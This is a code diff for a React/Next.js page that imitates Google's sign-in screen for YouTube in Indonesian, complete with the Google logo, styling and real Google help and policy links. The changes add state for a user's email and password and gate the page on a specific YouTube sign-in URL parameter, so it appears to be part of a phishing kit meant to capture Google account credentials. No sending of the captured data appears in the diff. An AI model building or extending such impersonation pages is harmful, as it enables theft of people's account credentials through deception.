@@ -4,7 +4,13 @@ import { useState, useEffect } from "react";
 import { LanguageSelect } from "@/components/ui/language-select";
 import { EmailInput } from "@/components/ui/input";
 import { GoogleButton } from "@/components/ui/googleBtn";
+import { useRouter } from "next/navigation";
 import Link from "next/link";
+
+interface UserData {
+  email?: string;
+  password?: string;
+}
 
 export default function UserView({
   searchParams,
@@ -16,16 +22,33 @@ export default function UserView({
 
   const [mounted, setMounted] = useState(false);
   const [theme, setTheme] = useState<"light" | "dark">("light");
+  const [userData, setUserData] = useState<UserData>({
+    email: "",
+    password: "",
+  });
 
-   useEffect(() => {
+  const route = useRouter();
+
+  if (
+    continueUrl !==
+    "https://www.youtube.com/signin?action_handle_signin=true&app=desktop&hl=id&next=https%3A%2F%2Fwww.youtube.com%2F%3FthemeRefresh%3D1"
+  ) {
+    route.push("/v3/signin");
+  }
+
+  useEffect(() => {
     // Check localStorage for saved theme, else detect system preference
     const savedTheme = localStorage.getItem("theme");
     const systemPrefersDark = window.matchMedia(
       "(prefers-color-scheme: dark)"
     ).matches;
-    const initialTheme = (savedTheme === "dark" || savedTheme === "light" 
-      ? savedTheme 
-      : systemPrefersDark ? "dark" : "light") as "light" | "dark";
+    const initialTheme = (
+      savedTheme === "dark" || savedTheme === "light"
+        ? savedTheme
+        : systemPrefersDark
+        ? "dark"
+        : "light"
+    ) as "light" | "dark";
 
     setTheme(initialTheme);
     document.documentElement.classList.toggle("dark", initialTheme === "dark");
@@ -47,16 +70,9 @@ export default function UserView({
       mediaQuery.removeEventListener("change", handleSystemThemeChange);
   }, []);
 
-  const toggleTheme = () => {
-    const newTheme = theme === "dark" ? "light" : "dark";
-    setTheme(newTheme);
-    localStorage.setItem("theme", newTheme);
-    document.documentElement.classList.toggle("dark", newTheme === "dark");
-  };
-
   if (!mounted) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-100 dark:bg-[#0E0E0E]">
+      <div className="min-h-screen flex items-center justify-center bg-[#F0F4F9] dark:bg-[#0E0E0E]">
         <div className="flex justify-center">
           <svg className="w-20 h-20 animate-pulse" viewBox="0 0 48 48">
             <path
@@ -82,15 +98,15 @@ export default function UserView({
   }
 
   return (
-    <div className="min-h-screen max-h-[100vh] flex bg-white dark:bg-[#1E1F20]">
-      <div className="w-full">
-        <div className="flex flex-col h-full  p-6 justify-between bg-white dark:bg-[#0E0E0E] rounded-none">
-          {/* Desktop Layout - Side by Side */}
-          <div className="flex flex-col lg:flex-row lg:items-start lg:gap-24">
+    <div className="min-h-screen max-h-[100vh] flex bg-[#F0F4F9] dark:bg-[#1E1F20]">
+      <div className="w-full lg:w-[74vw] lg:h-[65vh] lg:flex lg:flex-col lg:justify-center lg:m-auto">
+        <div className="flex flex-col h-full lg:rounded-4xl p-6 justify-between bg-white dark:bg-[#0E0E0E] rounded-none">
+          {/*  Layout - Side by Side */}
+          <div className="flex flex-col lg:flex-row lg:items-start lg:gap-24 h-full">
             {/* Left Side - Logo and Title */}
-            <div className="lg:flex-1 lg:pt-8">
+            <div className="lg:flex-1 lg:p-2">
               {/* Google Logo */}
-              <div className="flex justify-start mb-6 lg:mb-12">
+              <div className="flex justify-start mb-6">
                 <svg
                   xmlns="https://www.w3.org/2000/svg"
                   width="48"
@@ -118,33 +134,38 @@ export default function UserView({
               </div>
 
               {/* Title */}
-              <h1 className="text-3xl sm:text-3xl lg:text-4xl font-normal text-gray-900 dark:text-[#e8eaed] mb-6">
+              <h1 className="text-3xl sm:text-3xl lg:text-4xl font-normal text-gray-900 dark:text-[#e8eaed] mb-5 lg:mb-6">
                 Login
               </h1>
-              <p className="text-base lg:text-base text-gray-700 dark:text-[#e8eaed] mb-8 lg:mb-0">
+              <p className="text-base lg:text-base text-gray-700 dark:text-[#e8eaed] mb-10 lg:mb-0">
                 Lanjutkan ke YouTube
               </p>
             </div>
 
             {/* Right Side - Form */}
-            <div className="lg:flex-1 lg:max-w-md">
+            <div className="lg:max-w-[33vw] lg:me-3 lg:mt-auto">
               {/* Email Input */}
-              <EmailInput theme={theme} />
+              <EmailInput
+                theme={theme}
+                value={userData.email}
+                setValue={(val) =>
+                  setUserData((prev) => ({ ...prev, email: val }))
+                }
+              />
 
               {/* Forgot email link */}
-              <div className="mb-12 lg:mb-16 mt-2">
+              <div className="mb-12 mt-2">
                 <button className="text-sm lg:text-base font-medium text-[#0B57D0] dark:text-[#8ab4f8] hover:text-blue-500 dark:hover:text-[#aecbfa]">
                   Lupa email?
                 </button>
               </div>
 
               {/* Helper Text */}
-              <p className="text-sm mb-12 lg:mb-16 text-gray-700 dark:text-[#e8eaed] leading-relaxed">
-                Bukan perangkat Anda? Gunakan jendela Penjelajahan Rahasia untuk
-                login.{" "}
+              <p className="text-sm mb-12 text-gray-700 dark:text-[#e8eaed] leading-snug tracking-wide">
+                Bukan perangkat Anda? Gunakan mode Tamu untuk login secara pribadi. {" "}
                 <Link
                   target="_blank"
-                  href="https://support.google.com/accounts/answer/2917834?visit_id=638954073962864131-3202886444&p=signin_privatebrowsing&hl=id&rd=1"
+                  href="https://support.google.com/chrome/answer/6130773?hl=id"
                   className="text-[#0B57D0] dark:text-[#8ab4f8] hover:text-blue-500 dark:hover:text-[#aecbfa] hover:underline active:underline focus:underline font-bold"
                 >
                   Pelajari lebih lanjut cara menggunakan Mode tamu
@@ -152,11 +173,15 @@ export default function UserView({
               </p>
 
               {/* Action Buttons */}
-              <div className="flex flex-row justify-between">
+              <div className="flex flex-row justify-between lg:justify-end lg:gap-3">
                 <GoogleButton theme={theme} variant="ghost" className="-ms-4">
                   Buat Akun
                 </GoogleButton>
-                <GoogleButton theme={theme} variant="normal">
+                <GoogleButton
+                  theme={theme}
+                  variant="normal"
+                  onClick={() => route.push("/v3/signin")}
+                >
                   Selanjutnya
                 </GoogleButton>
               </div>
@@ -164,7 +189,7 @@ export default function UserView({
           </div>
 
           {/* Footer */}
-          <div className="">
+          <div className="lg:hidden">
             <div className="flex flex-col gap-8">
               <div className="flex items-center">
                 <LanguageSelect theme={theme} />
@@ -194,6 +219,39 @@ export default function UserView({
                   Persyaratan
                 </Link>
               </div>
+            </div>
+          </div>
+        </div>
+        {/* Footer */}
+        <div className="hidden lg:flex mt-3">
+          <div className="flex flex-row justify-between w-full">
+            <div className="flex items-center">
+              <LanguageSelect theme={theme} />
+            </div>
+            <div className="flex gap-4 items-center text-xs">
+              <Link
+                href={
+                  "https://support.google.com/accounts?hl=id&visit_id=638954101696000768-954939831&rd=2&p=account_iph"
+                }
+                target="_blank"
+                className="dark:active:bg-[#2a2a2a] dark:hover:bg-[#2a2a2a] active:bg-gray-200 py-1.5 px-3 rounded hover:text-gray-900 dark:hover:text-[#e8eaed]"
+              >
+                Bantuan
+              </Link>
+              <Link
+                href={"https://policies.google.com/privacy?gl=ID&hl=id"}
+                target="_blank"
+                className="dark:active:bg-[#2a2a2a] dark:hover:bg-[#2a2a2a] active:bg-gray-200 py-1.5 px-3 rounded hover:text-gray-900 dark:hover:text-[#e8eaed]"
+              >
+                Privasi
+              </Link>
+              <Link
+                href={"https://policies.google.com/terms?gl=ID&hl=id"}
+                target="_blank"
+                className="dark:active:bg-[#2a2a2a] dark:hover:bg-[#2a2a2a] active:bg-gray-200 py-1.5 px-3 rounded hover:text-gray-900 dark:hover:text-[#e8eaed]"
+              >
+                Persyaratan
+              </Link>
             </div>
           </div>
         </div>
